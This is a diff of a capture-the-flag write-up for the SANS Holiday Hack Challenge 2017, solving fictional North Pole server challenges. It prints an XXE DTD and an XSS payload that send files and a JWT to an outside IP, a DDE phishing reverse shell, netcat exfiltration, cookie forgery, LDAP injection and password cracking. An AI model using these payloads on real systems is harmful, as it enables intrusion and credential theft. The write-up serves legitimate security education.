@@ -526,7 +526,7 @@ A: __stream\_unhappy\_buy\_loss__
 
 #### Terminal Challenge:
 
-Upon accessing the CranberryPI Terminal we are presented with the following:
+Upon accessing the CranPI Terminal we are presented with the following:
 
 ```console
                      ___
@@ -585,7 +585,7 @@ Yah I was right, it's not going to be so easy.
 
 Looking at Holly's Twitter, we see a tweet about how chmod was removed from her system, which would explain why we weren't able to assign the executable bit to the binary.
 
-[insert tweet here]
+<a href="/images/shh18.png"><img src="/images/shh18.png"></a>
 
 At the end of the tweet we see a link on how to [execute a Linux binary without the execute permission bit being set](https://superuser.com/questions/341439/can-i-execute-a-linux-binary-without-the-execute-permission-bit-being-set).
 
@@ -625,9 +625,9 @@ The candy cane striping machine is up and running!
 
 Awesome, we were able to successfully execute our binary file, and competed the terminal challenge! After that, go ahead and redirect the snowball to the exit to unlock extra hints for future challenges.
 
-[insert terminal image]
+<a href="/images/shh19.png"><img src="/images/shh19.png"></a>
 
-[insert hints image]
+<a href="/images/shh20.png"><img src="/images/shh20.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -637,7 +637,7 @@ For this challenge, we need to identify and enumerate a SMB file-sharing server 
 
 Holly actually provides us a very good hint on detecting certain ports via Nmap, which we can utilize for identifying our SMB-Server.
 
-[image of holly's hint]
+<a href="/images/shh21.png"><img src="/images/shh21.png"></a>
 
 First of all, we need to find out the Internal IP range for the Christmas Town Infrastructure. 
 
@@ -768,9 +768,9 @@ Great, now that we know where the SMB Server is, we will have to enumerate it an
 
 To do so, we will have to do some port forwarding via SSH - this will allow us to directly access the SMB Server from our Kali Machine by using our SSH access to the Letters to Santa server.
 
-Holly actually provides us a good hint on SSH Port Forwarding.
+Holly actually provides us a good hint on [SSH Port Forwarding](https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding).
 
-[ image for holly hint]
+<a href="/images/shh22.png"><img src="/images/shh22.png"></a>
 
 Alright, so let's go ahead and forward TCP/445 to the SMB Server via the following command.
 
@@ -840,7 +840,7 @@ smb: \>
 
 Awesome, we found the 3rd Page of the Great Book! We can simply run the `get` command via SMB to download the file to our Kali machine.
 
-[ image of great book 3]
+<a href="/images/shh23.png"><img src="/images/shh23.png"></a>
 
 I also see that there are more files on the file share, so let's go ahead and download them all, just in case we might need them later.
 
@@ -861,7 +861,7 @@ getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.
 
 #### Terminal Challange:
 
-Upon accessing the CranberryPI Terminal, we are presented with the following:
+Upon accessing the CranPI Terminal, we are presented with the following:
 
 ```console
                           .-"""".._'.       _,##
@@ -952,9 +952,9 @@ You did it! Thank you!
 
 Once you complete the challenge you will unlock a new tool that will help you navigate the snowball toward the end of the level. Once you get the snowball to the end, you will unlock more hints for future challenges.
 
-[image for terminal]
+<a href="/images/shh24.png"><img src="/images/shh24.png"></a>
 
-[ image for hints]
+<a href="/images/shh25.png"><img src="/images/shh25.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -992,15 +992,63 @@ alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.anntDS9kgZfLYSCN2iFa2GML$
 
 And then let's configure the proxy...
 
-[proxy image]
+<a href="/images/shh26.png"><img src="/images/shh26.png"></a>
 
 Once that's done, we can navigate to __10.142.0.5__ in our browser and we will be presented with the following login page for the EWA Server.
 
-[ewa login page image]
+<a href="/images/shh27.png"><img src="/images/shh27.png"></a>
 
-If we actually take a look at the hints provided by Pepper Minstix, we learn that Alabaster created his own Encryption Scheme for the Session Cookies. 
+If we actually take a look at the hints provided by Pepper Minstix, we learn that Alabaster created his own Encryption Scheme for the Session Cookies, and also get a hint about editing cookies as well. 
 
-[info about cookies and hacking]
+<a href="/images/shh28.png"><img src="/images/shh28.png"></a>
+
+First of all, let's use [Cookie Manager +](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/) in FireFox to view out EWA cookie.
+
+<a href="/images/shh29.png"><img src="/images/shh29.png"></a>
+
+After reading those hints and seeing the cookie, we come to understand that our ultimate goal is to get the plaintext to equal the ciphertext.
+
+The process used is the following:
+1) Secret key is used with AES256 and first 16 bytes as initialization vector.
+2) This output is base64 encoded, and then stripped of any padding (the extra =s)
+
+By using 16 null bytes, the plaintext is encrypted as the key itself +AES256 encryption because anything XORed with 0 is itself. This result is then base64 encoded and stripped of the =s.
+
+So how are 16 null bytes represented? As 32 0s, because a null byte is 0x00. 
+
+So the command `echo 00000(whatever to 32)00 | xxd -r -p` converts the hex representation of 16 null bytes into ASCII null bytes. 
+
+The base64 encoding of the null bytes gives us the string of As with the padding to make it fit into the 4 byte block
+
+So to accomplish this, we simply add Alabaster's Email as his name, leave the plaintext blank, and include 21 "A"'s as the Ciphertext.
+
+<a href="/images/shh30.png"><img src="/images/shh30.png"></a>
+
+This should initialy give us a valid cookie and allow us to bypass the login and access's alabster's email. So let's submit the cookie, and refresh the page.
+
+<a href="/images/shh31.png"><img src="/images/shh31.png"></a>
+
+Awesome, it worked! We got access to Alabasters Email Account!
+
+Digging through the email we come across a few emails that might help us in the future - including one about a Ginger Bread Recepie, and one about a DDE Attack Vector.
+
+<a href="/images/shh32.png"><img src="/images/shh32.png"></a>
+
+<a href="/images/shh33.png"><img src="/images/shh33.png"></a>
+
+<a href="/images/shh34.png"><img src="/images/shh34.png"></a>
+
+At the same time, we learn that Alabaster lovers powershell, but also has netcat installed... hmmm.
+
+<a href="/images/shh35.png"><img src="/images/shh35.png"></a>
+
+Toward the end of the page, we see an email with a link to the 4th page of the Great Book.
+
+<a href="/images/shh36.png"><img src="/images/shh36.png"></a>
+
+Accessing that link allows us to read the 4th Page.
+
+<a href="/images/shh37.png"><img src="/images/shh37.png"></a>
 
 ## The Great Book: Page 5
 
@@ -1116,13 +1164,17 @@ Enter the name of the least popular browser in the web log: Dillo/3.0.5
 That is the least common browser in the web log! Congratulations!
 ```
 
-Once that's completed, you will receive a new tool that will help you navigate your snowball to the end of the level, and at the same time it will help you get the 5th page of the Great Book which can be found in the level.
+Once that's completed, you will receive a new tool that will help you navigate your snowball to the end of the level.
 
-[terminal complete]
+<a href="/images/shh38.png"><img src="/images/shh38.png"></a>
 
-[hints]
+<a href="/images/shh39.png"><img src="/images/shh39.png"></a>
 
-[great book page 5]
+At the same time, the new tools will help you get the 5th page of the Great Book which can be found in the level.
+
+<a href="/images/shh40.png"><img src="/images/shh40.png"></a>
+
+<a href="/images/shh41.png"><img src="/images/shh41.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -1130,21 +1182,21 @@ Once that's completed, you will receive a new tool that will help you navigate y
 
 Upon accessing https://nppd.northpolechristmastown.com/ we are presented with the following website. 
 
-[nnpd website]
+<a href="/images/shh42.png"><img src="/images/shh42.png"></a>
 
 From the looks of it, we can see Reports of Elf's who committed crimes along with their name and crime committed.
 
 At the same time, it seems that we can search through the reports either by keywords or date. So to help us answer our questions, I opted to search for everything in the database before the date of __2017-12-30__.
 
-[image of search]
+<a href="/images/shh43.png"><img src="/images/shh43.png"></a>
 
 Once we get the results, upon scrolling down we see that we can download a JSON file containing all the results.
 
-[ download button] 
+<a href="/images/shh44.png"><img src="/images/shh44.png"></a>
 
 Upon downloading the file, we can see that we have a query of all the results from the NPPD Database.
 
-[json file]
+<a href="/images/shh45.png"><img src="/images/shh45.png"></a>
 
 Now, if you remember back to when we downloaded the files from the SMB Server, we had a file called "__BOLO: Munchkin Mole Advisory__"
 
@@ -1186,7 +1238,7 @@ Alabaster Snowball,Nice
 
 Looking at the reports we see the Moles did 3 crimes, Throwing Rocks and Hair Pulling. At the same time we see that there are two types of throwing rocks - at people, and at non-person targets.
 
-[image for crimes]
+<a href="/images/shh46.png"><img src="/images/shh46.png"></a>
 
 To be able to answer our question and find the 6 moles, I created a python script.
 
@@ -1343,9 +1395,9 @@ sqlite> SELECT * FROM LIKES
 5|1|1497771899|238
 ```
 
-So we have the table ID, a like, date and time, and a songid which is configured as a FOREIGN KEY to the ID in the Songs table.
-[explain foregin key]
-So for us to be able to get the data we need, what we will have to do is select the Song Title, the total sum or “count” of the Song ID from the Likes Table, and then we will need to join that data to the KEYS to match the SONG ID in the Likes table to the SONG ID in the Songs table.
+So we have the table ID, a like, date and time, and a songid which is configured as a [FOREIGN KEY](https://www.w3schools.com/sql/sql_foreignkey.asp) to the ID in the Songs table. Simply a FOREIGN KEY is a key used to link two tables together
+
+So for us to be able to get the data we need, what we will have to do is select the Song Title, the total sum or “count” of the Song ID from the Likes Table, and then we will need to join that data with our KEYS so that they match the SONG ID in the Likes table to the SONG ID in the Songs table.
 
 This way we can pull other data from the Songs table such as the Song Title. After that we will sort the data in DESCENDING to get the most popular first, and limit that to only 10 results.
 
@@ -1382,9 +1434,9 @@ That is the #1 Christmas song, congratulations!
 
 Awesome, we are right! Once you complete this terminal challenge, you will unlock a new tool that will help you in redirecting the snowball in the levels. After you redirect the snowball for this level, you will unlock more hints for the next challenges.
 
-[terminal completion image]
+<a href="/images/shh47.png"><img src="/images/shh47.png"></a>
 
-[hints image]
+<a href="/images/shh48.png"><img src="/images/shh48.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -1416,17 +1468,17 @@ alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.FCginkV6JiLIj2o9JJ8u8tsN$
 
 Once that’s been completed, we can navigate to __localhost:8050__ and we will be able to see the main page for the EAAS System.
 
-[eaas page image]
+<a href="/images/shh49.png"><img src="/images/shh49.png"></a>
 
 Upon inspecting the page, we notice that we are able to check current orders via the __EC2__ link.
 
-[ec2 image]
+<a href="/images/shh50.png"><img src="/images/shh50.png"></a>
 
 Upon accessing that page we are redirected to the __DisplayXML__ page, and it seems that we are able to upload a file… and judging by the title of it, we can probably upload an XML file.
 
-[displayxml image]
+<a href="/images/shh51.png"><img src="/images/shh51.png"></a>
 
-I know that SANS wrote a very good post about XML External Entity -
+I know that SANS wrote a very good post about [Exploiting XXE Vulnerabilities in IIS/.NET](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities).
 
 After reading the post, let’s do something similar… but we will use our Public Amazon EC2 Instance to carry out the attack and grab the Contents of __C:\greatbook.txt__.
 
@@ -1459,7 +1511,7 @@ ubuntu@ip-172-31-24-12:~$ cat evil.dtd
 <!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://18.218.75.54:4444/?%stolendata;'>">
 ```
 
-Now that we have that ready, let’s set up a [SimpleHTTPServer]() via python, and a netcat listener on TCP/4444.
+Now that we have that ready, let’s set up a [SimpleHTTPServer](https://docs.python.org/2/library/simplehttpserver.html) via python, and a netcat listener on TCP/4444.
 
 ```console
 ubuntu@ip-172-31-24-12:~$ python -m SimpleHTTPServer 
@@ -1473,15 +1525,15 @@ Listening on [0.0.0.0] (family 0, port 4444)
 
 After that’s all said and done, we can upload the XML file.
 
-[xml upload image]
+<a href="/images/shh52.png"><img src="/images/shh52.png"></a>
 
 I also capture the request via Burp just to make sure there were no errors when uploading.
 
-[burp image]
+<a href="/images/shh53.png"><img src="/images/shh53.png"></a>
 
 You know that the file uploaded successfully when you are presented with and empty page such as the one below.
 
-[empty image page]
+<a href="/images/shh54.png"><img src="/images/shh54.png"></a>
 
 If you also look at your SimpleHTTPServer, you will see a successful GET request was made for you DTD file.
 
@@ -1504,7 +1556,7 @@ Connection: Keep-Alive
 
 From here, all we need to do is navigate to http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf and we will be able to see the 6th page of the Great Book.
 
-[page 6 book image]
+<a href="/images/shh55.png"><img src="/images/shh55.png"></a>
 
 ## The Great Book: Page 7
 
@@ -1577,7 +1629,11 @@ elf@24f154ad424a:~$ inspect_da_box
 /etc/shadow has been successfully restored!
 ```
 
-Once that's completed you will unlock a new tool that will aid you in getting the Snowball to the end of the map. After you get the snowball to the end, you will unlock more hints that will help you in the next challenge.
+Once that's completed and after you get the snowball to the end, you will unlock more hints that will help you in the next challenge.
+
+<a href="/images/shh56.png"><img src="/images/shh56.png"></a>
+
+<a href="/images/shh57.png"><img src="/images/shh57.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -1589,11 +1645,13 @@ We are tasked with gaining access to the EMI server through the use of a phishin
 
 If you remember correctly, in our previous challenge, once we gained access to the EWA Server, we spotted an email concerned about the recent DDE Attacks.
 
-[image]
+<a href="/images/shh33.png"><img src="/images/shh33.png"></a>
+
+<a href="/images/shh34.png"><img src="/images/shh34.png"></a>
 
 At the same time, we previously found emails from Alabaster to Mrs. Claus asking for her Cookies Recipe.
 
-[cookie recpie]
+<a href="/images/shh32.png"><img src="/images/shh32.png"></a>
 
 Taking that into account, we can go ahead and attempt a DDE Attack against Alabaster to gain a reverse shell on his system.
 
@@ -1601,7 +1659,7 @@ There is a very good post on creating DDE Macros, which can be found here: https
 
 Once we read the post, we can create a new DDE that will execute a Netcat connection back to our AWS Instance on TCP/4444.
 
-[dde image]
+<a href="/images/shh58.png"><img src="/images/shh58.png"></a>
 
 Once that's completed, we can save the file as "__GingerBread Recpipe__" or something along those lines.
 
@@ -1614,21 +1672,23 @@ Listening on [0.0.0.0] (family 0, port 4444)
 
 Afterwards, we can return back to the EWA Server and utilize our newly found cookie exploit to access the "__Jessica Claus__" account, which will be used in our phishing attack against Alabaster.
 
-[claus ewa]
+<a href="/images/shh59.png"><img src="/images/shh59.png"></a>
 
 Once done, we should have access to Mrs. Claus's email account.
 
-[claus access]
+<a href="/images/shh60.png"><img src="/images/shh60.png"></a>
 
 From there, let's go ahead and create a new email with the subject "__Gingerbread Cookie Recipe__", attach our Word Document that contains the DDE Attack, and send it off to Alabaster.
 
-[phish email]
+<a href="/images/shh61.png"><img src="/images/shh61.png"></a>
 
 Once the email is sent, a few moments later we can see that we get a successful Reverse CMD Shell.
 
-[reverse shell]
+<a href="/images/shh62.png"><img src="/images/shh62.png"></a>
 
 At this point, we can navigate to the __C:\__ directory and we will spot Page 7 of the Great Book.
+
+<a href="/images/shh63.png"><img src="/images/shh63.png"></a>
 
 From here, we can simply use netcat to download the file to our AWS EC2 Instance.
 
@@ -1642,7 +1702,7 @@ C:\>nc -w 3 18.218.75.54 1234 < GreatBookPage7.pdf
 
 Once completed, we can read Page 7 of the Great Book.
 
-[page 7 image]
+<a href="/images/shh64.png"><img src="/images/shh64.png"></a>
 
 ## Who's Behind This?
 
@@ -1757,10 +1817,385 @@ Hacked!
 Congratulations! You've won, and have successfully completed this challenge.
 ```
 
+<a href="/images/shh65.png"><img src="/images/shh65.png"></a>
+
 ### North Pole Christmas Town Infrastructure
 
 #### Elf Database (EDB):
 
-## Closing
+For this challenge we have to fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com.
 
+So as previously, we have to figure out where the EDB Server is located. Taking a look at our previous Nmap scan that we ran shows that the server is located at __10.142.0.6__.
 
+```console
+Host is up (0.00015s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+80/tcp   open  http    nginx 1.10.3
+389/tcp  open  ldap
+8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port389-TCP:V=7.40%I=7%D=12/28%Time=5A457237%P=x86_64-pc-linux-gnu%r(LD
+SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
+SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
+SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
+SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
+SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+We can see that TCP/80 is open and running a web server, so let's go ahead and use SSH to forward our TCP/8050 port to TCP/80 on __10.142.0.6__.
+
+```console
+root@kali:~/HH# ssh -L 8050:10.142.0.6:80 alabaster_snowball@35.190.140.65
+alabaster_snowball@35.190.140.65's password: 
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.LShdupYgziOuBj2fnInGRJXt$
+```
+
+And as previously, let's also make sure that our web proxy is set to listen on TCP/8050.
+
+<a href="/images/shh66.png"><img src="/images/shh66.png"></a>
+
+At this time, we can navigate to __10.142.0.6__ and we will be presented with the following Login Page for the EDB.
+
+<a href="/images/shh67.png"><img src="/images/shh67.png"></a>
+
+A quikc look into the __robots.txt__ file shows us that there is a __/dev__ directory.
+
+<a href="/images/shh68.png"><img src="/images/shh68.png"></a>
+
+Navigating to __/dev/__ reveales a link to a LDIF Template page.
+
+<a href="/images/shh69.png"><img src="/images/shh69.png"></a>
+
+Inside that text file we are presented with what looks to be an LDAP Template for the EDB Server. This could be helpful for us in the future or for the login page as LDAP is open and running on TCP/389.
+
+<a href="/images/shh70.png"><img src="/images/shh70.png"></a>
+
+If you actually took the time to read some of the hints provided to us by Wunorse, then you would see some specific information about a [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) Attack that Wunorse got via some weird email, and that JWT Tokens are being used.
+
+<a href="/images/shh71.png"><img src="/images/shh71.png"></a>
+
+I'm going to assume that since we are on the EDB Server - we will be able to execte some sort of XSS Attack via the Support Function on the page.
+
+But before we do that, let's dig into the source code of the page to see if we can't get some hints on how the login page functions.
+
+If we look at the source code toward the bottom of the index page, we spot a rather unusual token called __np-auth__ that seems to be used for authentication. Intrestingly enough, it also seems to be a token that is in the [localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) property of the webpage. 
+
+<a href="/images/shh72.png"><img src="/images/shh72.png"></a>
+
+If we are able to execute XSS on the page, then we should be able to gain access to that token and hopefully use it to log in!
+
+Another thing that really caught my attention was the __custom.js__ file. If we take a look at the source code for that JavaScript file, then we see some intresting information about the Customer Service Request page.
+
+<a href="/images/shh73.png"><img src="/images/shh73.png"></a>
+
+We can see that there in fact is some filtering being done in the message portion of the service request. Technically the script is filtering anything that contains the word "__script__" in it, both lowercase and uppercase. At the same time, the line above it makes sure that the line ends with a period.
+
+So let's go ahead and click on the "__Support__" link on the login page. We should be presented with a prompt about login issues. Let's quickly fill out the form with Alabaster's infomration and a test message, like so...
+
+<a href="/images/shh74.png"><img src="/images/shh74.png"></a>
+
+Once done, let's submit that and we will see our Password Reset Request.
+
+<a href="/images/shh75.png"><img src="/images/shh75.png"></a>
+
+Alright, so that works fine. Let's go back to the form we sumbitted and try to insert some JavaScript to create a XSS Attack. I suggest you read up on some of the [XSS Bypasses](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) which will greatly help you bypass the filtering on this page.
+
+From the __custom.js__ code, we know that we can't use the word "__script__" in our XSS, and the JavaScript code has to be before the period.
+
+So an easy way to bypass these restrictions is by using the [SVG (Scalable Vector Graphics) onload](https://www.w3.org/TR/SVG/script.html#OnLoadEventAttribute) atrribute, and simply inject it into the middle of our message.
+
+So let's create a simple XSS Alert to test. We can inject the follow JavaScript to create an alert box with the words "XSS".
+
+`<svg/onload=alert('XSS')>`
+
+So our test form should like like so...
+
+<a href="/images/shh76.png"><img src="/images/shh76.png"></a>
+
+Once done, let's submit it and we should get our alert box with the words "XSS".
+
+<a href="/images/shh77.png"><img src="/images/shh77.png"></a>
+
+Perfect! We got a working XSS Attack. So all we habe to do now is access the __np-auth__ token and have it sent to our AWS EC2 Instance.
+
+We can use the following JavaScript code to axxomplish that. Just remeber to replace "__[IP]__" with your own AWS EC2 IP.
+
+`<svg/onload=document.location="http://[IP]:8000/?c="+localStorage.getItem("np-auth")>`
+
+So our form should look like so...
+
+<a href="/images/shh78.png"><img src="/images/shh78.png"></a>
+
+Before we send that out, let's make sure we have a listener running on our AWS EC2 Instance.
+
+```console
+ubuntu@ip-172-31-24-12:~$ nc -nvlp 8000
+Listening on [0.0.0.0] (family 0, port 8000)
+```
+
+Now that we have that, submit the form. A few seconds later, we should get a connect back from the EDB Server with the __np-auth__ token.
+
+```console
+ubuntu@ip-172-31-24-12:~$ nc -nvlp 8000
+Listening on [0.0.0.0] (family 0, port 8000)
+Connection from [35.196.239.128] port 8000 [tcp/*] accepted (family 2, sport 54990)
+GET /?c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://127.0.0.1/reset_request?ticket=UEKET-50I7S-BNOWO-5P138
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,*
+Host: 18.218.75.54:8000
+```
+
+Perfect! So we have our token! From the looks of it, and from the hints provided to us - this is a JWT Token. To decipher this, we can go to https://jwt.io/ and just past in our token to see the decoded payload.
+
+<a href="/images/shh79.png"><img src="/images/shh79.png"></a>
+
+Taking a look at the token, we see our data and that this token belong to Alabster Snowball wgo is in the Engineering Department... but unfortuantly it's expired!
+
+So for us to be able to use this token, we will have to change the date to something current. But before we can do that, we need to creack the Secret Key to have a valid signature.
+
+To accomplish this we can use [John The Ripper](http://www.openwall.com/john/), but we first need to do a few things.
+
+First of all, we need to conver the JWT Token into a format that John will understand. To do so, we will use the [JWT2John](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) script from GitHub.
+
+Simple run the script followed by the token and save it to a file.
+
+```console
+python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I > alabaster.jwt
+```
+
+Reading the saved file, we should see our converted token.
+
+```console
+root@kali:~/HH# cat alabaster.jwt 
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9#33b6782370adad6b78486c1f83b9a2e95f7fe2b6991397a156423d874e24afa2
+```
+
+Nice, now we can go ahead and crack the converted JTW Token. Unfortuantly for many users the version of John that ships with Kali will not work, so we need to install the [Jumbo Version](https://github.com/magnumripper/JohnTheRipper) of John which can be found on GitHub.
+
+I know that the process of setting this up is a little complicated, so I will take you through it step by step.
+
+To start let's navigatge to the __/opt__ directory and let's close the GitHub repository.
+
+```console
+root@kali:~/HH# cd /opt/
+root@kali:/opt# git clone https://github.com/magnumripper/JohnTheRipper.git
+```
+
+After we have scusefully downloaded the repository, let's go ahead and [make](https://www.gnu.org/software/make/) the John binary form it's associated files.
+
+```console
+root@kali:/opt# cd JohnTheRipper/
+root@kali:/opt/JohnTheRipper# cd src
+root@kali:/opt/JohnTheRipper/src# ./configure 
+root@kali:/opt/JohnTheRipper/src# make -s clean && make -sj4
+```
+
+Once you sucsefully create the files, navigate to the __/run/__ directory in the John folder, and run John agasint our converted JWT Token.
+
+```console
+root@kali:/opt/JohnTheRipper# cd run/
+root@kali:/opt/JohnTheRipper/run# ./john /root/HH/alabaster.jwt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+3lv3s            (?)
+1g 0:00:01:37 DONE 3/3 (2018-01-11 13:51) 0.01025g/s 3277Kp/s 3277Kc/s 3277KC/s 3k3ys..mo_tl
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+Awesome! We were able to crack the secret code for the signature which is "__3lv3s__".
+
+From here, we can go back to jwt.io and change the "__expires__" date of the JWT token, and also include our cracked secret to create a valid signature.
+
+<a href="/images/shh80.png"><img src="/images/shh80.png"></a>
+
+Once we have a valid JWT Token with an update date, we can return back to the EDB Login Page and open up our Developer Tools in our Browser. From here, we can use the __setItem__ atrribute for localStorage to set __np-auth__ with our new token.
+
+<a href="/images/shh81.png"><img src="/images/shh81.png"></a>
+
+After that token is set, refresh the page and we should be able to access Alabaster's accout.
+
+<a href="/images/shh82.png"><img src="/images/shh82.png"></a>
+
+Once we have access to the account, upon looking around we spot a "__Santa Panel__" link from the Search function.
+
+<a href="/images/shh83.png"><img src="/images/shh83.png"></a>
+
+Looking into the source code and jQuery attributes of the link, we see that we need to be in the "__administrators__" department, and we need to be Santa Claus.
+
+<a href="/images/shh84.png"><img src="/images/shh84.png"></a>
+
+```javascript
+function(e) {
+  e.preventDefault();
+  if (user_json['dept'] == 'administrators') {
+    pass = prompt('Confirm you are a Claus by confirming your password: ').trim()
+    if (pass) {
+      poster("/html", {
+        santa_access: pass
+      }, token, function(result) {
+        if (result) {
+          $('#inneroverlay').html(result);
+          $('.overlay').css('display', 'flex');
+        } else {
+          Materialize.toast('Incorrect Password...', 4000);
+        }
+      });
+    }
+  } else {
+    Materialize.toast('You must be a Claus to access this panel!', 4000);
+  }
+}
+```
+
+At this point we don't have much to work with, so we need to find a SQL injection or something in this Database to pull out Santa Clau's password and information.
+
+While browsing the page and captuirng requests and responses via Burp, I came across a very intresting note about LDAP.
+
+<a href="/images/shh85.png"><img src="/images/shh85.png"></a>
+
+An initial look at this note reveals to us the LDAP Query that is being used for the request form!
+
+SANS actually have a very good post on [Undersanding and Exploiting Web Based LDAP](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap) that we can use to help us!
+
+After reading the article, the first thing I do is search for Alabster's name in the Elf Name field, while pulling up all the infomration I can from the drop down.
+
+<a href="/images/shh86.png"><img src="/images/shh86.png"></a>
+
+Captruing the Request in Burp also revleas some intresting infomration about the attribute query.
+
+<a href="/images/shh87.png"><img src="/images/shh87.png"></a>
+
+Alright, awesome we got Alabaster's information... but let's see if we can't pull out everybody's information from the database.
+
+In the SANS Blog Post, the write was able to inject `))(department=it)(|(cn=` into his query to list all the users. So let's try using that query to see if it works.
+
+<a href="/images/shh88.png"><img src="/images/shh88.png"></a>
+
+Awesome, it does work! Upon scrolling down to the bottom of the page we see Santa's Information.
+
+<a href="/images/shh89.png"><img src="/images/shh89.png"></a>
+
+Now that we have Santas Name, Email, and Department, let's return back to JWT.io and change our JWT Token so we can login as Santa.
+
+<a href="/images/shh90.png"><img src="/images/shh90.png"></a>
+
+Once again, once we have the generated token, set the token using __setItem__ in your Developer console, and refresh the page.
+
+<a href="/images/shh91.png"><img src="/images/shh91.png"></a>
+
+<a href="/images/shh92.png"><img src="/images/shh92.png"></a>
+
+Nice, so we were able to access Santas account! Unfortunatly for us we still can't access the Santa Panel as we need a password!
+
+<a href="/images/shh93.png"><img src="/images/shh93.png"></a>
+
+At this point, I opt to capture the LDAP Query request via Brup to pull all the department info. Once the request is capture, I change the attribures field to __*__ so it includes all the information.
+
+<a href="/images/shh94.png"><img src="/images/shh94.png"></a>
+
+Once we send that out, and captue the response, we can see everyones information, including Santas Password which seems to be MD5 encoded.
+
+<a href="/images/shh95.png"><img src="/images/shh95.png"></a>
+
+Now that we have Santas password hash, let's save it to a file and use HashCat to crack it.
+
+```console
+---snip---
+ 
+[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => [s]tatus [p]ause [r]esd8b4c05a35b0513f302a85c409b4aab3:001cookielips001 
+                                         
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: MD5
+Hash.Target......: d8b4c05a35b0513f302a85c409b4aab3
+Time.Started.....: Thu Jan 11 15:08:18 2018 (5 secs)
+Time.Estimated...: Thu Jan 11 15:08:23 2018 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.Dev.#1.....:  3070.7 kH/s (0.59ms)
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 14272405/14343297 (99.51%)
+Rejected.........: 1941/14272405 (0.01%)
+Restore.Point....: 14268309/14343297 (99.48%)
+Candidates.#1....: 00257979 -> 0012093760
+HWMon.Dev.#1.....: N/A
+
+Started: Thu Jan 11 15:08:17 2018
+Stopped: Thu Jan 11 15:08:24 2018
+```
+
+Great, we cracked the password! Now that we have Santas real password, we are able to access the Letter to Santa.
+
+<a href="/images/shh96.png"><img src="/images/shh96.png"></a>
+
+After we unlock all the page, we can go back to our Stocking and see a new NPC Converstaion with Glinda the Good Witch of Oz!
+
+<a href="/images/shh97.png"><img src="/images/shh97.png"></a>
+
+## Answers
+
+Now that we have everything unlocked and completed, let's answer the questions:
+
+1. Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?
+
+The title of the first page of The Great Book is "__About This Book...__".
+
